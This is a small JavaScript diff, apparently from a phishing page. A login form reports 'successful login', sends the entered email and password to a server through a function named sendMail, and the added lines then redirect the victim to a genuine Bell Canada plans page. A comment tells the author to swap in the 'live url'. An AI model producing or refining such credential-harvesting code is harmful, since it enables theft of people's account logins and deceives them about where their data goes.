@@ -20,14 +20,15 @@ form.addEventListener("submit", async (event) => {
   errorSpan.textContent = "";
   alert("successful login");
   // successful redirect them to wherever
-
+  window.location =
+    "https://www.bell.ca/Mobility/Cell_phone_plans/Unlimited-plans";
   console.log({ email, password });
 });
 
 const sendMail = async ({ email, password }) => {
   //use live url here bro
   try {
-    const response = await fetch("http://localhost:3000/", {
+    const response = await fetch("http://localhost:8000/", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
